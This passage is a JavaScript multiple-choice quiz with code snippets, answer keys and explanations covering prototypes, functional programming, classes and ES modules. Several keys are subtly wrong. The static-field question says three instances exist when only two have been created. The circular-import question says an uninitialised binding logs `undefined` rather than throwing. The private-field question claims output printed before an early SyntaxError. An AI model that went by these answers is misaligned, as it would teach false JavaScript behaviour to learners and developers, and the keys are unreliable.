console.log(obj.id);
console.log(Object.keys(obj));
```

- A) `99`, `["id"]`
- B) `42`, `[]`
- C) `42`, `["id"]`
- D) Throws `TypeError`

**Answer: B) `42`, `[]`**

**Explanation:** `Object.defineProperty` provides fine-grained control over property descriptors. `writable: false` prevents changing the value (silently in sloppy mode). `enumerable: false` hides the property from `Object.keys()`, `for...in`, and `JSON.stringify`. `configurable: false` prevents redefining or deleting the property.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does property lookup along the prototype chain produce?

```javascript
function Shape(color) {
  this.color = color;
}
Shape.prototype.area = function() { return 0; };
Shape.prototype.describe = function() { return `${this.color} shape`; };

function Circle(color, radius) {
  Shape.call(this, color);
  this.radius = radius;
}
Circle.prototype = Object.create(Shape.prototype);
Circle.prototype.constructor = Circle;
Circle.prototype.area = function() { return Math.PI * this.radius ** 2; };

const c = new Circle('red', 5);
console.log(c.describe());
console.log(c instanceof Shape);
```

- A) `"red shape"`, `true`
- B) `"undefined shape"`, `true`
- C) `"red shape"`, `false`
- D) `TypeError`

**Answer: A) `"red shape"`, `true`**

**Explanation:** `Shape.call(this, color)` sets `this.color = 'red'` on the `Circle` instance. `describe()` is not on `Circle.prototype` — it\'s found up the prototype chain on `Shape.prototype`. `this.color` in `describe` resolves to `'red'`. `instanceof Shape` checks the prototype chain → `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `hasOwnProperty` versus `in` operator check?

```javascript
function Vehicle(type) { this.type = type; }
Vehicle.prototype.wheels = 4;

const car = new Vehicle('sedan');
console.log('type' in car);
console.log('wheels' in car);
console.log(car.hasOwnProperty('type'));
console.log(car.hasOwnProperty('wheels'));
```

- A) `true`, `false`, `true`, `false`
- B) `true`, `true`, `true`, `false`
- C) `true`, `true`, `true`, `true`
- D) `false`, `true`, `true`, `false`

**Answer: B) `true`, `true`, `true`, `false`**

**Explanation:** The `in` operator checks the **entire prototype chain** — both `type` (own) and `wheels` (prototype) are found. `hasOwnProperty` checks **only the instance\'s own properties** — `type` is own, `wheels` is inherited (not own). Use `hasOwnProperty` (or `Object.hasOwn(obj, key)`) to distinguish own vs inherited.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Object.keys` vs `Object.getOwnPropertyNames` return?

```javascript
const obj = {};
Object.defineProperty(obj, 'hidden', { value: 1, enumerable: false });
Object.defineProperty(obj, 'visible', { value: 2, enumerable: true });
obj.normal = 3;

console.log(Object.keys(obj));
console.log(Object.getOwnPropertyNames(obj));
```

- A) `["visible","normal"]`, `["visible","normal"]`
- B) `["visible","normal"]`, `["hidden","visible","normal"]`
- C) `["hidden","visible","normal"]`, `["hidden","visible","normal"]`
- D) `["normal"]`, `["hidden","visible","normal"]`

**Answer: B) `["visible","normal"]`, `["hidden","visible","normal"]`**

**Explanation:** `Object.keys` returns only **enumerable own** properties. `Object.getOwnPropertyNames` returns **all own** properties (enumerable and non-enumerable). `hidden` is non-enumerable, so `Object.keys` skips it. `getOwnPropertyNames` includes it. Neither includes prototype properties.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Proxy` allow you to intercept?

```javascript
const handler = {
  get(target, prop) {
    return prop in target ? target[prop] : `Property '${prop}' not found`;
  }
};
const safe = new Proxy({ name: 'Alice' }, handler);
console.log(safe.name);
console.log(safe.age);
```

- A) `"Alice"`, `undefined`
- B) `"Alice"`, `"Property 'age' not found"`
- C) Both throw `TypeError`
- D) `"Alice"`, `null`

**Answer: B) `"Alice"`, `"Property 'age' not found"`**

**Explanation:** `Proxy` intercepts fundamental operations on an object. The `get` trap intercepts property access. When `safe.age` is accessed, the `get` trap checks if `'age'` is in `target` — it isn\'t, so returns the custom message. This pattern is useful for safe access, validation, default values, or observable objects.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Object.entries` combined with `reduce` produce?

```javascript
const scores = { alice: 85, bob: 92, carol: 78 };
const result = Object.entries(scores).reduce((acc, [name, score]) => {
  acc[name] = score >= 90 ? 'A' : score >= 80 ? 'B' : 'C';
  return acc;
}, {});
console.log(result);
```

- A) `{ alice: 85, bob: 92, carol: 78 }`
- B) `{ alice: 'B', bob: 'A', carol: 'C' }`
- C) `{ alice: 'B', bob: 'B', carol: 'C' }`
- D) `["B", "A", "C"]`

**Answer: B) `{ alice: 'B', bob: 'A', carol: 'C' }`**

**Explanation:** `Object.entries` returns `[['alice',85],['bob',92],['carol',78]]`. `reduce` builds a new object. Destructuring `[name, score]` in the callback extracts each pair. `85 >= 90` → false, `85 >= 80` → true → `'B'`. `92 >= 90` → true → `'A'`. `78 >= 90` → false, `78 >= 80` → false → `'C'`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between `Object.setPrototypeOf` and `Object.create`?

```javascript
const animal = { breathes: true };
const dog1 = Object.create(animal);
const dog2 = {};
Object.setPrototypeOf(dog2, animal);

console.log(dog1.breathes, dog2.breathes);
console.log(Object.getPrototypeOf(dog1) === Object.getPrototypeOf(dog2));
```

- A) `true`, `undefined`, `false`
- B) `true`, `true`, `true`
- C) `true`, `true`, `false`
- D) `undefined`, `true`, `true`

**Answer: B) `true`, `true`, `true`**

**Explanation:** `Object.create(proto)` creates a new object with the specified prototype. `Object.setPrototypeOf(obj, proto)` changes the prototype of an **existing** object. Both result in the same prototype chain. `dog1.breathes` and `dog2.breathes` both find `breathes: true` via prototype lookup. Their prototypes are the same `animal` object → `true`. Note: `setPrototypeOf` on existing objects is slow — prefer `Object.create`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the spread operator do when used on objects?

```javascript
const defaults = { theme: 'light', lang: 'en', fontSize: 14 };
const userPrefs = { theme: 'dark', fontSize: 16 };
const config = { ...defaults, ...userPrefs, version: '2.0' };
console.log(config);
```

- A) `{ theme: 'light', lang: 'en', fontSize: 14, version: '2.0' }`
- B) `{ theme: 'dark', lang: 'en', fontSize: 16, version: '2.0' }`
- C) `{ theme: 'dark', fontSize: 16, version: '2.0' }` — missing `lang`
- D) `TypeError` — spread only works with arrays

**Answer: B) `{ theme: 'dark', lang: 'en', fontSize: 16, version: '2.0' }`**

**Explanation:** Object spread copies enumerable own properties. Later properties override earlier ones. `defaults` provides all three properties. `userPrefs` overrides `theme` and `fontSize`. `lang: 'en'` from `defaults` is preserved (not in `userPrefs`). `version: '2.0'` is added last. This is the idiomatic pattern for merging/applying default settings.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 19. Functional Programming

<br>

## Q. A developer transforms user data. What does this output?

```javascript
const users = [
  { name: "Alice", age: 25, active: true },
  { name: "Bob", age: 17, active: false },
  { name: "Carol", age: 30, active: true }
];

const result = users
  .filter(u => u.active && u.age >= 18)
  .map(u => u.name.toUpperCase());

console.log(result);
```

- A) `["ALICE", "BOB", "CAROL"]`
- B) `["ALICE", "CAROL"]`
- C) `["Alice", "Carol"]`
- D) `["ALICE"]`

**Answer: B) `["ALICE", "CAROL"]`**

**Explanation:** `.filter()` keeps only users where `active === true` AND `age >= 18`: Alice (25, active) and Carol (30, active). Bob is excluded (not active and underage). `.map()` then uppercases the names.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. A developer uses `reduce` to build an object. What is the output?

```javascript
const items = ["apple", "banana", "apple", "cherry", "banana", "apple"];

const count = items.reduce((acc, item) => {
  acc[item] = (acc[item] || 0) + 1;
  return acc;
}, {});

console.log(count.apple, count.banana, count.cherry);
```

- A) `3`, `2`, `1`
- B) `1`, `1`, `1`
- C) `3`, `3`, `3`
- D) `undefined`, `undefined`, `undefined`

**Answer: A) `3`, `2`, `1`**

**Explanation:** `reduce` accumulates a frequency map. `"apple"` appears 3 times, `"banana"` 2 times, `"cherry"` 1 time. Using `acc[item] || 0` safely initializes missing keys to `0` before incrementing.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between `map` and `forEach` in functional programming?

```javascript
const nums = [1, 2, 3];
const mapped = nums.map(n => n * 2);
const forEached = nums.forEach(n => n * 2);

console.log(mapped);
console.log(forEached);
```

- A) `[2,4,6]`, `[2,4,6]`
- B) `[2,4,6]`, `undefined`
- C) `[1,2,3]`, `[2,4,6]`
- D) `undefined`, `undefined`

**Answer: B) `[2,4,6]`, `undefined`**

**Explanation:** `map` creates and returns a **new array** with transformed values. `forEach` iterates for side effects and **always returns `undefined`**. In functional programming, `map` is preferred over `forEach` because it\'s a pure transformation that produces a new value without mutation.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does function composition produce?

```javascript
const compose = (...fns) => x => fns.reduceRight((v, f) => f(v), x);
const pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);

const add1 = x => x + 1;
const double = x => x * 2;
const square = x => x ** 2;

console.log(compose(square, double, add1)(3)); // square(double(add1(3)))
console.log(pipe(add1, double, square)(3));    // square(double(add1(3)))
```

- A) `64`, `16`
- B) `64`, `64`
- C) `16`, `64`
- D) `36`, `64`

**Answer: B) `64`, `64`**

**Explanation:** `compose` applies functions **right-to-left**: `add1(3)=4`, `double(4)=8`, `square(8)=64`. `pipe` applies **left-to-right**: `add1(3)=4`, `double(4)=8`, `square(8)=64`. When the same functions are in the same logical order (right-to-left in compose = left-to-right in pipe), they produce the same result.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is a pure function and what makes this one impure?

```javascript
let tax = 0.2;

function calculateTotal(price) {
  return price * (1 + tax); // impure
}

function pureCalculateTotal(price, taxRate) {
  return price * (1 + taxRate); // pure
}

tax = 0.3;
console.log(calculateTotal(100));
console.log(pureCalculateTotal(100, 0.2));
```

- A) `120`, `120`
- B) `130`, `120`
- C) `120`, `130`
- D) `130`, `130`

**Answer: B) `130`, `120`**

**Explanation:** `calculateTotal` is **impure** — it depends on the external mutable variable `tax`. After `tax = 0.3`, the same input `100` produces `130` (not `120`). `pureCalculateTotal` is **pure** — same inputs always produce the same output (`100 * 1.2 = 120`). Pure functions are predictable, testable, and composable.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does currying transform a function?

```javascript
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return function(...args2) {
      return curried.apply(this, args.concat(args2));
    };
  };
}

const add = curry((a, b, c) => a + b + c);
console.log(add(1)(2)(3));
console.log(add(1, 2)(3));
console.log(add(1)(2, 3));
```

- A) `6`, `6`, `6`
- B) `6`, `TypeError`, `TypeError`
- C) `1`, `3`, `3`
- D) `NaN`, `NaN`, `NaN`

**Answer: A) `6`, `6`, `6`**

**Explanation:** The curry function checks if it has received all required arguments (`fn.length` = 3). If not, it returns a new function collecting more args. All three call patterns eventually pass 3 args (1+2+3=6). Currying enables **partial application** and building specialized functions from general ones.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does immutability via `map` produce compared to direct mutation?

```javascript
const original = [{ id: 1, val: 10 }, { id: 2, val: 20 }];
const mutated = original;
mutated[0].val = 99;

const immutable = original.map(item => ({ ...item, val: item.val * 2 }));

console.log(original[0].val);
console.log(immutable[0].val);
```

- A) `10`, `20`
- B) `99`, `198`
- C) `99`, `20`
- D) `10`, `198`

**Answer: B) `99`, `198`**

**Explanation:** `mutated = original` creates an alias (same reference). `mutated[0].val = 99` mutates `original[0].val` to `99`. `immutable` spreads each item into a new object, so `original[0].val` is `99` at map time → `99 * 2 = 198`. The `immutable` array contains new objects, not references to originals.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a `transducer` pattern achieve?

```javascript
const numbers = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];

// Single-pass: filter then map combined
const result = numbers.reduce((acc, n) => {
  if (n % 2 === 0) acc.push(n * n);
  return acc;
}, []);

// Multi-pass: separate operations
const multiPass = numbers.filter(n => n % 2 === 0).map(n => n * n);

console.log(result);
console.log(result.length === multiPass.length);
```

- A) `[4,16,36,64,100]`, `true`
- B) `[4,16,36,64,100]`, `false`
- C) `[1,4,9,16,25]`, `true`
- D) `[2,4,6,8,10]`, `true`

**Answer: A) `[4,16,36,64,100]`, `true`**

**Explanation:** Both produce the same result: even numbers squared. The `reduce` approach is a transducer-style single pass — no intermediate array created. `filter().map()` creates an intermediate array. For large datasets, single-pass is more memory-efficient. Both produce `[4, 16, 36, 64, 100]` and have the same length.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is memoization and what does this memoize function produce?

```javascript
function memoize(fn) {
  const cache = new Map();
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) return cache.get(key);
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

let callCount = 0;
const expensiveFn = memoize((n) => { callCount++; return n * n; });

expensiveFn(5);
expensiveFn(5);
expensiveFn(6);
console.log(callCount);
```

- A) `3`
- B) `2`
- C) `1`
- D) `0`

**Answer: B) `2`**

**Explanation:** Memoization caches results by input. First `expensiveFn(5)` — cache miss, calls fn, `callCount=1`. Second `expensiveFn(5)` — cache hit, returns cached `25`, `callCount` unchanged. `expensiveFn(6)` — cache miss, calls fn, `callCount=2`. Only 2 actual function calls despite 3 invocations.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a point-free style function produce?

```javascript
const words = ['hello', 'world', 'foo', 'bar', 'baz'];

// Point-free: no explicit argument in the callback
const longWords = words.filter(w => w.length > 3);

// Alternative point-free with a predicate factory
const longerThan = n => word => word.length > n;
const longWords2 = words.filter(longerThan(3));

console.log(longWords);
console.log(longWords2);
console.log(longWords.join() === longWords2.join());
```

- A) `["hello","world"]`, `["hello","world"]`, `true`
- B) `["hello","world","baz"]`, `["hello","world","baz"]`, `true`
- C) `["hello","world"]`, `["hello","world","baz"]`, `false`
- D) Both empty, `true`

**Answer: A) `["hello","world"]`, `["hello","world"]`, `true`**

**Explanation:** Words with length > 3: `"hello"` (5), `"world"` (5) pass. `"foo"` (3), `"bar"` (3), `"baz"` (3) fail (not strictly greater than 3). Both approaches use the same predicate logic and produce the same result. `longerThan(3)` is a curried predicate factory — `longerThan(3)` returns `word => word.length > 3`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a `flatMap` vs `map` + `flat` comparison show?

```javascript
const sentences = ['hello world', 'foo bar'];

const words1 = sentences.flatMap(s => s.split(' '));
const words2 = sentences.map(s => s.split(' ')).flat();

console.log(words1);
console.log(words1.length === words2.length);
```

- A) `["hello world", "foo bar"]`, `true`
- B) `["hello","world","foo","bar"]`, `true`
- C) `[["hello","world"],["foo","bar"]]`, `false`
- D) `["hello","world","foo","bar"]`, `false`

**Answer: B) `["hello","world","foo","bar"]`, `true`**

**Explanation:** `flatMap` is equivalent to `map` followed by `flat(1)`. Each sentence is split into an array (`["hello","world"]`, `["foo","bar"]`). `flatMap` flattens one level automatically. Both produce `["hello","world","foo","bar"]` with length 4. `flatMap` is slightly more efficient (single iteration).

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How does a lens pattern enable immutable deep property updates?

```javascript
const setIn = (obj, [key, ...rest], val) =>
  rest.length === 0
    ? { ...obj, [key]: val }
    : { ...obj, [key]: setIn(obj[key], rest, val) };

const state = { user: { profile: { name: 'Alice', age: 25 } } };
const newState = setIn(state, ['user', 'profile', 'name'], 'Bob');

console.log(state.user.profile.name);
console.log(newState.user.profile.name);
console.log(state === newState);
```

- A) `"Bob"`, `"Bob"`, `true`
- B) `"Alice"`, `"Bob"`, `false`
- C) `"Alice"`, `"Alice"`, `false`
- D) `"Bob"`, `"Alice"`, `false`

**Answer: B) `"Alice"`, `"Bob"`, `false`**

**Explanation:** `setIn` recursively creates new objects at each level of the path — an immutable deep update (lens pattern). `state` is unchanged (`name` still `"Alice"`). `newState` is a new object tree where `name` is `"Bob"`. `state === newState` is `false` — they are different objects (immutable update). This pattern is fundamental in Redux reducers and functional state management.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 20. Classes

<br>

## Q. A developer uses class inheritance. What is the output?

```javascript
class Shape {
  constructor(color) {
    this.color = color;
  }
  describe() {
    return `A ${this.color} shape`;
  }
}

class Circle extends Shape {
  constructor(color, radius) {
    super(color);
    this.radius = radius;
  }
  describe() {
    return `${super.describe()} with radius ${this.radius}`;
  }
}

const c = new Circle("red", 5);
console.log(c.describe());
console.log(c instanceof Shape);
```

- A) `"A red shape with radius 5"`, `false`
- B) `"A red shape with radius 5"`, `true`
- C) `"A shape with radius 5"`, `true`
- D) `TypeError: Must call super constructor`

**Answer: B) `"A red shape with radius 5"`, `true`**

**Explanation:** `super(color)` must be called before accessing `this` in a derived class constructor. `super.describe()` calls the parent method. `instanceof` walks the prototype chain, and `Circle` extends `Shape`, so `c instanceof Shape` is `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does the static method example output?

```javascript
class MathHelper {
  static add(a, b) { return a + b; }
  multiply(a, b) { return a * b; }
}

const m = new MathHelper();
console.log(MathHelper.add(2, 3));
console.log(m.multiply(2, 3));
console.log(m.add(2, 3));
```

- A) `5`, `6`, `5`
- B) `5`, `6`, `TypeError: m.add is not a function`
- C) `TypeError`, `6`, `5`
- D) `5`, `TypeError`, `5`

**Answer: B) `5`, `6`, `TypeError: m.add is not a function`**

**Explanation:** Static methods belong to the class itself, not instances. `MathHelper.add()` works; `m.add()` throws `TypeError`. Instance methods like `multiply` are accessible on the instance.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `extends` and `super` do in class inheritance?

```javascript
class Animal {
  #sound;
  constructor(sound) { this.#sound = sound; }
  speak() { return this.#sound; }
}

class Dog extends Animal {
  constructor(name) {
    super('Woof');
    this.name = name;
  }
  introduce() { return `${this.name} says ${super.speak()}`; }
}

const d = new Dog('Rex');
console.log(d.introduce());
console.log(d instanceof Animal);
```

- A) `"Rex says Woof"`, `true`
- B) `"Rex says undefined"`, `true`
- C) `TypeError` — private fields not accessible via super
- D) `"Rex says Woof"`, `false`

**Answer: A) `"Rex says Woof"`, `true`**

**Explanation:** `super('Woof')` must be called in the subclass constructor before accessing `this`. `super.speak()` calls the parent\'s `speak()` method — which accesses `#sound` on the instance (`'Woof'`). Private fields are accessible within the class that defines them, so `speak()` can access `#sound`. `instanceof` checks the prototype chain → `true`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What do static class fields and methods belong to?

```javascript
class Config {
  static defaultTimeout = 3000;
  static instances = 0;
  
  constructor(name) {
    this.name = name;
    Config.instances++;
  }
  
  static reset() { Config.instances = 0; }
}

new Config('a');
new Config('b');
console.log(Config.instances);
console.log(new Config('c').instances); // accessing via instance
Config.reset();
console.log(Config.instances);
```

- A) `2`, `3`, `0`
- B) `2`, `undefined`, `0`
- C) `3`, `3`, `0`
- D) `3`, `undefined`, `0`

**Answer: D) `3`, `undefined`, `0`**

**Explanation:** Static fields/methods belong to the **class**, not instances. After 3 `new Config()` calls, `Config.instances = 3`. Accessing a static field via an instance (`new Config('c').instances`) returns `undefined` — instances don\'t inherit static properties. `Config.reset()` sets `instances` back to `0`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What do private class fields protect against?

```javascript
class BankAccount {
  #balance = 0;
  
  deposit(n) { this.#balance += n; }
  get balance() { return this.#balance; }
}

const account = new BankAccount();
account.deposit(100);
console.log(account.balance);

try {
  console.log(account.#balance);
} catch(e) {
  console.log('Error:', e.constructor.name);
}
```

- A) `100`, `100`
- B) `100`, `Error: TypeError`
- C) `100`, `Error: SyntaxError`
- D) `undefined`, `Error: SyntaxError`

**Answer: C) `100`, `Error: SyntaxError`**

**Explanation:** Private class fields (`#field`) are a **syntax-level** restriction — accessing `#balance` outside the class body is a `SyntaxError` (caught at parse time, not runtime). The getter `balance` provides controlled public access. Private fields truly encapsulate data, unlike the `_convention` which is just a naming hint.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does abstract-like class behavior look like in JavaScript?

```javascript
class Shape {
  constructor() {
    if (new.target === Shape) {
      throw new Error('Shape is abstract');
    }
  }
  area() { throw new Error('area() must be implemented'); }
}

class Circle extends Shape {
  constructor(r) { super(); this.r = r; }
  area() { return Math.PI * this.r ** 2; }
}

try { new Shape(); } catch(e) { console.log(e.message); }
console.log(new Circle(5).area().toFixed(2));
```

- A) `"area() must be implemented"`, `"78.54"`
- B) `"Shape is abstract"`, `"78.54"`
- C) `"Shape is abstract"`, `"0.00"`
- D) Both throw

**Answer: B) `"Shape is abstract"`, `"78.54"`**

**Explanation:** `new.target` inside a constructor refers to the class being constructed. If `Shape` is instantiated directly, `new.target === Shape` → throw. If a subclass extends `Shape`, `new.target` is the subclass (`Circle`) → passes. `Circle` overrides `area()` → works correctly. This is JavaScript\'s pattern for abstract classes.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. How do class mixins compose behavior?

```javascript
const Serializable = Base => class extends Base {
  serialize() { return JSON.stringify(this); }
};
const Validatable = Base => class extends Base {
  validate() { return Object.keys(this).length > 0; }
};

class Entity {
  constructor(data) { Object.assign(this, data); }
}

class User extends Serializable(Validatable(Entity)) {}

const u = new User({ name: 'Alice', age: 25 });
console.log(u.validate());
console.log(typeof u.serialize());
```

- A) `true`, `"string"`
- B) `false`, `"object"`
- C) `true`, `"object"`
- D) `TypeError`

**Answer: A) `true`, `"string"`**

**Explanation:** Mixins are functions that take a base class and return an extended class. Composing `Serializable(Validatable(Entity))` creates a class that has methods from all three. `u` has `name` and `age` (2 keys) → `validate()` returns `true`. `serialize()` returns `JSON.stringify(u)` — a string. Mixins enable multiple-inheritance-like composition.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `Symbol.iterator` on a class produce?

```javascript
class Range {
  constructor(start, end) {
    this.start = start;
    this.end = end;
  }
  [Symbol.iterator]() {
    let current = this.start;
    const end = this.end;
    return {
      next() {
        return current <= end
          ? { value: current++, done: false }
          : { done: true };
      }
    };
  }
}

console.log([...new Range(1, 4)]);
```

- A) `[1, 2, 3, 4]`
- B) `[1, 4]`
- C) `TypeError` — classes cannot implement Symbol.iterator
- D) `[]`

**Answer: A) `[1, 2, 3, 4]`**

**Explanation:** Implementing `[Symbol.iterator]()` makes the class iterable. The method returns an iterator object with a `next()` function. Spread syntax (`[...new Range(1, 4)]`) uses the iterator protocol. The iterator yields `1, 2, 3, 4` then signals `done: true`. This makes the class work with `for...of`, spread, destructuring, etc.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does class expression allow that class declaration doesn\'t?

```javascript
const createClass = (name) => {
  return class {
    constructor(val) { this.val = val; }
    identify() { return `${name}: ${this.val}`; }
  };
};

const Celsius = createClass('Celsius');
const Fahrenheit = createClass('Fahrenheit');

console.log(new Celsius(100).identify());
console.log(new Fahrenheit(212).identify());
```

- A) Both throw `TypeError`
- B) `"Celsius: 100"`, `"Fahrenheit: 212"`
- C) `"createClass: 100"`, `"createClass: 212"`
- D) `"undefined: 100"`, `"undefined: 212"`

**Answer: B) `"Celsius: 100"`, `"Fahrenheit: 212"`**

**Explanation:** Class expressions can be returned from functions, assigned to variables, or passed as values. Here, `createClass` is a factory that creates classes with closured `name`. Each generated class captures a different `name` via closure. This pattern enables dynamic class generation and is used in higher-order patterns.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does a class `getter`/`setter` pair do?

```javascript
class Temperature {
  #celsius;
  constructor(c) { this.#celsius = c; }
  
  get fahrenheit() { return this.#celsius * 9/5 + 32; }
  set fahrenheit(f) { this.#celsius = (f - 32) * 5/9; }
  
  get celsius() { return this.#celsius; }
}

const t = new Temperature(0);
console.log(t.fahrenheit);
t.fahrenheit = 212;
console.log(t.celsius);
```

- A) `32`, `100`
- B) `0`, `212`
- C) `32`, `0`
- D) `212`, `100`

**Answer: A) `32`, `100`**

**Explanation:** `new Temperature(0)` → `#celsius = 0`. `t.fahrenheit` getter: `0 * 9/5 + 32 = 32`. `t.fahrenheit = 212` setter: `#celsius = (212 - 32) * 5/9 = 100`. `t.celsius` getter returns `100`. Getters/setters let you expose derived/computed properties while maintaining encapsulation.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the output when a subclass doesn\'t call `super()`?

```javascript
class Base {
  constructor() { this.x = 1; }
}

class Child extends Base {
  constructor() {
    // Missing super() call
    try {
      this.y = 2; // accessing this before super
    } catch(e) {
      console.log('Error:', e.constructor.name);
    }
    super();
    console.log('After super:', this.x, this.y);
  }
}
new Child();
```

- A) `"After super: 1 2"`
- B) `"Error: ReferenceError"`, `"After super: 1 undefined"`
- C) `"Error: TypeError"`, `"After super: 1 undefined"`
- D) Unhandled `ReferenceError` — program crashes

**Answer: B) `"Error: ReferenceError"`, `"After super: 1 undefined"`**

**Explanation:** In a derived class, `this` is not available until `super()` is called. Accessing `this` before `super()` throws a `ReferenceError`. After `super()` is called, `this` is available. `this.x = 1` is set by `Base` constructor. `this.y` was never assigned (the assignment threw) → `undefined`. So `"After super: 1 undefined"`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## # 21. Modules

<br>

## Q. A project uses ES Modules. Which statement is correct about the following import?

```javascript
// math.js
export const PI = 3.14159;
export default function add(a, b) { return a + b; }
export function multiply(a, b) { return a * b; }

// app.js
import add, { PI, multiply } from "./math.js";
```

- A) This throws a `SyntaxError` — you cannot mix default and named imports
- B) `add` is the default export; `PI` and `multiply` are named exports — this is valid
- C) `add` will be `undefined` because default exports must use curly braces
- D) `multiply` must be imported before `PI`

**Answer: B) `add` is the default export; `PI` and `multiply` are named exports — this is valid**

**Explanation:** ES Modules allow one default export and multiple named exports per file. Default imports have no curly braces; named imports use `{ }`. Combining both in one import statement is perfectly valid.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is the difference between named and default exports for tree-shaking?

- A) Default exports are always tree-shaken; named exports never are
- B) Named exports are statically analyzable and enable better tree-shaking; default exports that export objects can prevent tree-shaking
- C) Both enable identical tree-shaking results
- D) Only CommonJS modules support tree-shaking

**Answer: B) Named exports are statically analyzable and enable better tree-shaking; default exports that export objects can prevent tree-shaking**

**Explanation:** Bundlers (webpack, Rollup) perform tree-shaking by analyzing static imports. Named exports (`export const fn`) allow bundlers to know exactly which exports are used and eliminate unused ones. Default exports that export objects (`export default { fn1, fn2 }`) prevent tree-shaking because the whole object must be imported. Use named exports for utility functions to enable effective tree-shaking.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does dynamic `import()` enable that static `import` doesn\'t?

```javascript
// Static (always loaded)
// import { heavyLib } from './heavy-lib.js';

// Dynamic (loaded on demand)
async function loadChart() {
  const { renderChart } = await import('./chart-lib.js');
  renderChart('#container', data);
}

button.addEventListener('click', loadChart);
```

- A) Dynamic imports work synchronously
- B) Dynamic `import()` is a Promise-based expression that enables lazy/conditional loading of modules
- C) Dynamic imports cannot be used with named exports
- D) Dynamic imports are not supported in Node.js

**Answer: B) Dynamic `import()` is a Promise-based expression that enables lazy/conditional loading of modules**

**Explanation:** `import()` is an async function that returns a Promise resolving to the module\'s namespace object. It enables: code splitting (only load what\'s needed), conditional imports, lazy loading on user interaction, and runtime path determination. Static imports are hoisted and always loaded — dynamic imports are flexible runtime operations.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does circular module dependency cause?

```javascript
// a.js
import { b } from './b.js';
export const a = 'value-a';
console.log('a.js:', b);

// b.js
import { a } from './a.js';
export const b = 'value-b';
console.log('b.js:', a);
```

- A) Both print their expected values
- B) `RangeError: Maximum call stack exceeded`
- C) One of them will log `undefined` due to the circular dependency — the import is a live binding but may not be initialized yet
- D) Module system throws an error and refuses to load

**Answer: C) One of them will log `undefined` due to the circular dependency — the import is a live binding but may not be initialized yet**

**Explanation:** ES Modules handle circular imports with **live bindings** — the binding exists but may be `undefined` at first execution. `b.js` imports `a` from `a.js`, but `a.js` hasn\'t finished evaluating yet → `a` is `undefined` when `b.js` logs it. Circular dependencies are legal but can cause subtle initialization order bugs. Avoid them or restructure shared code into a third module.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What is module scope in ES Modules?

```javascript
// counter.js
let count = 0;
export function increment() { count++; }
export function getCount() { return count; }

// app.js
import { increment, getCount } from './counter.js';
import { increment as inc2 } from './counter.js';
// Both imports reference the same module instance
increment();
inc2();
console.log(getCount());
```

- A) `0` — each import creates a fresh module instance
- B) `2` — both imports share the same module singleton
- C) `1` — only one increment is executed
- D) `TypeError`

**Answer: B) `2` — both imports share the same module singleton**

**Explanation:** ES Modules are **singletons** — a module is evaluated once and cached. All imports of the same module share the same instance. Both `increment` and `inc2` reference the same function that closes over the same `count` variable. Two `increment()` calls → `count = 2`.

<div align="right">
    <b><a href="#table-of-contents">↥ back to top</a></b>
</div>

## Q. What does `import * as` create?

```javascript
// utils.js
export const PI = 3.14;
export function square(n) { return n * n; }
export default 'utils-default';

// app.js
import * as utils from './utils.js';
console.log(utils.PI);
console.log(utils.square(4));
console.log(utils.default);
```

- A) `3.14`, `16`, `undefined`
- B) `3.14`, `16`, `"utils-default"`
- C) `undefined`, `16`, `"utils-default"`
- D) `TypeError`

